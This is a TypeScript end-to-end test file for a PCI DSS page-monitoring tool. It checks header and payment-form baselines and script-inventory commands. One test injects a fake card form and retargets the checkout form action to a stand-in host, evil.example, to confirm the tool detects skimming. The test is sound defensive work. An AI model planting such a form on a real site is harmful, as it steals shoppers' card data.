import { readFile } from 'node:fs/promises';
import { join } from 'node:path';
import { afterAll, afterEach, beforeAll, describe, expect, it, vi } from 'vitest';
import { FixtureServer } from '../fixtures/server.js';
import { installStoreSite } from '../fixtures/store-site.js';
import { makeProject } from '../helpers.js';
import { main } from '../../src/cli/index.js';
import type { AnalysisReport } from '../../src/types/report.js';

/**
 * PCI DSS support end to end: header and form baselines, an injected fake card form
 * with a re-targeted form action, and the script inventory commands.
 */

const server = new FixtureServer();
let dir = '';
let cleanup: () => Promise<void> = () => Promise.resolve();

async function cli(...args: string[]): Promise<{ code: number; stdout: string }> {
  const chunks: string[] = [];
  const spy = vi.spyOn(process.stdout, 'write').mockImplementation((chunk: string | Uint8Array) => {
    chunks.push(typeof chunk === 'string' ? chunk : Buffer.from(chunk).toString());
    return true;
  });
  try {
    const code = await main(['node', 'thirdsentry', '--config', join(dir, 'thirdsentry.yml'), ...args]);
    return { code: Number(process.exitCode ?? code), stdout: chunks.join('') };
  } finally {
    spy.mockRestore();
    process.exitCode = undefined;
  }
}

async function report(): Promise<AnalysisReport> {
  return JSON.parse(await readFile(join(dir, '.thirdsentry', 'reports', 'report.json'), 'utf8')) as AnalysisReport;
}

const CHECKOUT = (extra: string, action: string): string => `<!doctype html><html><head><title>Checkout</title>
<script src="http://cdn.vendor-a.test:{port}/lib.js"></script>
<script src="http://cdn.vendor-a.test:{port}/pay.js"></script>
</head><body>
<form action="${action}" method="post">
  <input name="email" type="email">
  <input name="cardnumber" autocomplete="cc-number">
  <input name="cvc" autocomplete="cc-csc">
  <input name="exp" autocomplete="cc-exp">
</form>${extra}</body></html>`;

const HEADERS = { 'x-frame-options': 'DENY', 'content-security-policy': "script-src 'self' http://cdn.vendor-a.test:{port}; form-action 'self'" };

beforeAll(async () => {
  await server.start();
  installStoreSite(server);
  server.html('shop.test', '/checkout', CHECKOUT('', '/pay'), HEADERS);
  const project = await makeProject(server.port, {
    sites: [{ name: 'shop', url: `http://shop.test:${server.port}/`, pages: ['/', '/checkout'], sensitivePages: ['/checkout'] }],
    pci: { requireJustification: true },
    failOn: 'none',
  });
  dir = project.dir;
  cleanup = project.cleanup;
}, 60_000);

afterAll(async () => {
  await cleanup();
  await server.stop();
});

afterEach(() => {
  process.exitCode = undefined;
});

describe('PCI DSS support end to end', () => {
  it('baselines headers and form structure, then reports nothing for an unchanged site', async () => {
    expect((await cli('scan', '--allow-missing-baseline')).code).toBe(0);
    expect((await cli('baseline', '--yes')).code).toBe(0);
    const baseline = JSON.parse(await readFile(join(dir, '.thirdsentry', 'baselines', 'shop', 'baseline.json'), 'utf8')) as {
      schemaVersion: number;
      pageSecurity: Record<string, { headers?: Record<string, string>; forms?: { forms: Array<{ action: string; fields: Array<{ name: string; payment: boolean }> }> } }>;
    };
    expect(baseline.schemaVersion).toBe(2);
    expect(baseline.pageSecurity['/checkout']?.headers?.['x-frame-options']).toBe('deny');
    expect(baseline.pageSecurity['/checkout']?.forms?.forms[0]?.action).toMatch(/\/pay$/);
    expect(baseline.pageSecurity['/checkout']?.forms?.forms[0]?.fields.filter((f) => f.payment)).toHaveLength(3);
    expect(baseline.pageSecurity['/']?.forms).toBeUndefined(); // forms are captured on sensitive pages only

    await cli('scan', '--fail-on', 'none');
    const rep = await report();
    expect(rep.findings.filter((f) => ['security-header-changed', 'payment-form-changed', 'security-baseline-missing'].includes(f.kind))).toEqual([]);
  }, 180_000);

  it('detects an injected fake card form with a re-targeted form action, and a weakened CSP', async () => {
    const fake = `<form action="https://evil.example/collect" method="post"><input name="cc_number" autocomplete="cc-number"><input name="cvv"></form>`;
    server.html(
      'shop.test',
      '/checkout',
      CHECKOUT(fake, 'https://evil.example/steal'),
      { 'content-security-policy': "script-src 'self' 'unsafe-inline' http://cdn.vendor-a.test:{port}; form-action 'self'" },
    );
    const r = await cli('scan', '--fail-on', 'high');
    expect(r.code).toBe(1);
    const rep = await report();
    const form = rep.findings.find((f) => f.kind === 'payment-form-changed');
    const header = rep.findings.filter((f) => f.kind === 'security-header-changed');
    expect(form).toBeDefined();
    expect(['high', 'critical']).toContain(form?.severity);
    expect(form?.evidence.map((e) => e.value).join('\n')).toMatch(/evil\.example/);
    expect(header.length).toBe(1);
    expect(['high', 'critical']).toContain(header[0]?.severity); // unsafe-inline added plus x-frame-options removed on a payment page
    expect(rep.findings.every((f) => f.title && f.reason && f.recommendedAction && f.signals.length > 0)).toBe(true);
    // Reports in every format survive the new kinds.
    const sarif = JSON.parse(await readFile(join(dir, '.thirdsentry', 'reports', 'report.sarif'), 'utf8')) as { runs: Array<{ tool: { driver: { rules: Array<{ id: string; shortDescription: { text: string } }> } } }> };
    const rule = sarif.runs[0]?.tool.driver.rules.find((x) => x.id === 'thirdsentry/payment-form-changed');
    expect(rule?.shortDescription.text).toMatch(/payment form/);
    expect(await readFile(join(dir, '.thirdsentry', 'reports', 'report.html'), 'utf8')).toContain('Script inventory (PCI DSS 6.4.3)');
  }, 180_000);

  it('selective approval of the form finding leaves the header finding open', async () => {
    const rep = await report();
    const form = rep.findings.find((f) => f.kind === 'payment-form-changed');
    const r = await cli('baseline', '--yes', '--approve', form?.id ?? 'none');
    expect(r.code).toBe(0);
    await cli('scan', '--fail-on', 'none');
    const kinds = (await report()).findings.map((f) => f.kind);
    expect(kinds).not.toContain('payment-form-changed');
    expect(kinds).toContain('security-header-changed');
  }, 180_000);

  it('inventory: lists, fails --check without justification, then passes after "inventory add"', async () => {
    const list = await cli('inventory', '--format', 'csv');
    expect(list.code).toBe(0);
    expect(list.stdout).toContain('missing-justification');
    expect(list.stdout).toContain('pay.js');
    expect(list.stdout).not.toContain('app.mjs'); // not on a sensitive page

    expect((await cli('inventory', '--check')).code).toBe(1);

    const rep = await report();
    expect(rep.findings.some((f) => f.kind === 'script-unjustified' && f.severity !== 'high')).toBe(true);
    expect(rep.pci?.sites[0]?.missingJustification).toBeGreaterThan(0);

    const baselinePath = join(dir, '.thirdsentry', 'baselines', 'shop', 'baseline.json');
    const before = await readFile(baselinePath, 'utf8');
    const common = ['--purpose', 'Vendor widget', '--owner', 'payments', '--authorized-by', 'ciso'];
    expect((await cli('inventory', 'add', 'http://cdn.vendor-a.test:*/*', ...common)).code).toBe(0);
    expect(await readFile(baselinePath, 'utf8')).toBe(before); // baselines are never touched
    expect(await readFile(join(dir, '.thirdsentry', 'inventory', 'shop.yml'), 'utf8')).toContain('cdn.vendor-a.test');
    expect((await cli('inventory', 'add', 'http://cdn.vendor-a.test:*/*', ...common)).code).toBe(2);

    const md = await cli('inventory', '--format', 'markdown');
    expect(md.stdout).toContain('Vendor widget');
    expect((await cli('inventory', '--check')).code).toBe(0);
  }, 180_000);
});
